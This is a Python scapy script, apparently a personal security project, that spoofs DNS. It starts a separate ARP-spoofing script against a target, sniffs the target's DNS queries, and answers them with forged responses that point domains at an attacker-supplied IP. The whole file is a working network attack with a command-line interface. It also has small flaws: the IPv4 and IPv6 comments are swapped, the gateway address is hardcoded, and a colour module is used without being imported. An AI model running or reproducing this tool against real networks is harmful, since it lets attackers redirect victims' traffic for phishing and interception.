# Author: Gal Gabay


# Import the necessary modules from scapy
import subprocess
import argparse

from scapy.all import *


def get_mac(ip):
  """
  Discover the MAC address of specific IP by ARP request (who-has packet)
  :param ip: ip to check his MAC address
  :return: MAC address of the ip
  """
  try:
    who_has_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=ip)
    ans = srp1(who_has_packet, timeout=2, verbose=False)  # sends the who-has packet and assigns the answer into ans
    return ans[ARP].hwsrc  # the MAC address
  except TypeError:  # if the given IP isn't recognized
    print(f"{Fore.RED}ARP reply not found to 'who has {ip} request'\n"
          f"Maybe this ip address isn't in your LAN{Fore.RESET}")
    sys.exit(1)


# create parent function with passed in arguments
def dns_sniffer_wrapper(target: str, iface: str, faked_ip: str):
  """
  Handle the sniffed dns packet by closeure:
  - check if this packet is a DNS query packet, if not exit, if so send the fake answer
  - The fake answer is built based on the query fields plus the fake address where we want to direct the victim.
  :param pkt: the dns sniff packet
  :return:
  """
  DNS_SERVER_IPv4 = target
  DNS_SERVER_MAC = get_mac(DNS_SERVER_IPv4)
  # Set the faked target IP for DNS entry
  FAKED_IP = faked_ip
  def dns_sniffer(pkt):
    # Check if the packet is a DNS query with IPv4
    if pkt.haslayer(IPv6) and pkt.haslayer(DNS) and pkt[DNS].qr == 0:
      # Print the query details
      print("DNS Query: {}: {} -> {}".format(pkt[DNS].qd.qname, pkt[IPv6].src, pkt[IPv6].dst))
      # Create a DNS response packet with the fake IP address
      dns_response = Ether(src=get_mac('192.168.1.1')) / IPv6(src=pkt[IPv6].dst, dst=pkt[IPv6].src) / UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / DNS(
        id=pkt[DNS].id, qr=1, aa=1, ra=1, rcode=0, qdcount=1, ancount=1, qd=pkt[DNS].qd, an=DNSRR(
          rrname=pkt[DNSQR].qname, type="A", rclass="IN", ttl=3600, rdata=FAKED_IP))
      # Send the forged DNS response
      sendp(dns_response,iface=iface, verbose=False)

    # Check if the packet is a DNS query with IPv6
    elif pkt.haslayer(IP) and pkt.haslayer(DNS) and pkt[DNS].qr == 0:
      # Print the query details
      print("DNS Query: {}: {} -> {}".format(pkt[DNS].qd.qname, pkt[IP].src, pkt[IP].dst))
      # Create a DNS response packet with the fake IP address
      dns_response = Ether(src=get_mac('192.168.1.1')) / IP(src=pkt[IP].dst, dst=pkt[IP].src) / UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / DNS(
        id=pkt[DNS].id, qr=1, aa=1, ra=1, rcode=0, qdcount=1, ancount=1, qd=pkt[DNS].qd, an=DNSRR(
          rrname=pkt[DNSQR].qname, type="A", rclass="IN", ttl=3600, rdata=FAKED_IP))
      # Send the forged DNS response
      sendp(dns_response,iface=iface, verbose=False)

  return dns_sniffer



def args_parser():
  """
  Parse the user's file args
  :return: parsed arguments
  """
  parser = argparse.ArgumentParser(description='Spoof DNS server cache')
  parser.add_argument('-i', '--iface', metavar="IFACE", default=conf.iface, type=str,
                      help='Interface you wish to use')
  parser.add_argument('-f', '--fakedip', metavar="FAKEDIP", required=True, type=str,
                      help='Faked IP you want to assign')
  parser.add_argument('-t', '--target', metavar="TARGET", required=True, type=str, help='IP of targeted DNS server')
  return parser.parse_args()


def main():
  args = args_parser()
  subprocess.Popen([f"python3 ./arp_spoofing.py -t {args.target} -d 3 -gw"], shell=True)
  FILTER = f"udp port 53 and ether src {get_mac(args.target)}"
  # Start sniffing for DNS queries
  sniff(filter=FILTER, prn=dns_sniffer_wrapper(args.target,args.iface,args.fakedip))

if __name__ == '__main__':
    main()